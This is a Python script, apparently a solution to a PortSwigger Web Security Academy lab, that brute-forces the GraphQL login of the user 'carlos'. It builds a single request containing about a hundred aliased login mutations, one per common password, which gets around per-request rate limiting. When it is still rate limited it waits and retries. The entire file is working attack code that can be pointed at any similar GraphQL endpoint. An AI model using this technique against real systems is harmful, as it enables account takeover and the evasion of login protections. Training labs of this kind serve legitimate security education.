#!/usr/bin/env python3
import requests
import json
from time import sleep

class Bruteforcer:
    def __init__(self, url, passwordWordlist):
        self.url = url
        self.passwordWordlist = passwordWordlist
        self.session = requests.Session()

    def prepareLoginMutationQuery(self):
        query = '{"query": "'
        counter = 0
        for password in self.passwordWordlist:
            if counter != 0:
                mutationLoginQuery = 'login'
                mutationLoginQuery += str(counter)
                mutationLoginQuery += ':login(input:{username:\\"carlos\\",password:\\"'
                mutationLoginQuery += password
                mutationLoginQuery += '\\"}){token,success}'
                query += mutationLoginQuery
                counter += 1
            else:
                mutationLoginQuery = 'mutation login {login(input:{username:\\"carlos\\",password:\\"'
                mutationLoginQuery += password
                mutationLoginQuery += '\\"}){token,success}'
                query += mutationLoginQuery
                counter += 1

        query += '}"}'
        return query

    def bruteforce(self, query):
        headers = {
            'Content-Type': 'application/json'
        }
        bruteforceResponse = self.session.post(self.url, data=query, headers=headers)
        print('[*] Sending the login aliases query...')

        if 'true' in bruteforceResponse.text:
            jsonResponse = json.loads(bruteforceResponse.text)
            for login in jsonResponse['data']:
                successValue = jsonResponse['data'][login]['success']
                if successValue == True:
                    passwordIndex = int(login[5:])
                    print('[+] Found the correct password!')
                    print(f'[+] Username: carlos, password: {passwordWordlist[passwordIndex]}')
            return

        if 'You have made too many incorrect login attempts.' in bruteforceResponse.text:
            print('[-] Rate limited!! Please wait 1 minute... (Sleeping 1 minute)')
            sleep(60)
            self.bruteforce(query)
            return

if __name__ == '__main__':
    url = 'https://0ab0007a0329831a81b098510010008c.web-security-academy.net/graphql/v1'
    passwordWordlist = ['123456', 'password', '12345678', 'qwerty', '123456789', '12345', '1234', '111111', '1234567', 'dragon', '123123', 'baseball', 'abc123', 'football', 'monkey', 'letmein', 'shadow', 'master', '666666', 'qwertyuiop', '123321', 'mustang', '1234567890', 'michael', '654321', 'superman', '1qaz2wsx', '7777777', '121212', '000000', 'qazwsx', '123qwe', 'killer', 'trustno1', 'jordan', 'jennifer', 'zxcvbnm', 'asdfgh', 'hunter', 'buster', 'soccer', 'harley', 'batman', 'andrew', 'tigger', 'sunshine', 'iloveyou', '2000', 'charlie', 'robert', 'thomas', 'hockey', 'ranger', 'daniel', 'starwars', 'klaster', '112233', 'george', 'computer', 'michelle', 'jessica', 'pepper', '1111', 'zxcvbn', '555555', '11111111', '131313', 'freedom', '777777', 'pass', 'maggie', '159753', 'aaaaaa', 'ginger', 'princess', 'joshua', 'cheese', 'amanda', 'summer', 'love', 'ashley', 'nicole', 'chelsea', 'biteme', 'matthew', 'access', 'yankees', '987654321', 'dallas', 'austin', 'thunder', 'taylor', 'matrix', 'mobilemail', 'mom', 'monitor', 'monitoring', 'montana', 'moon', 'moscow']
    
    bruteforcer = Bruteforcer(url, passwordWordlist)
    query = bruteforcer.prepareLoginMutationQuery()
    bruteforcer.bruteforce(query)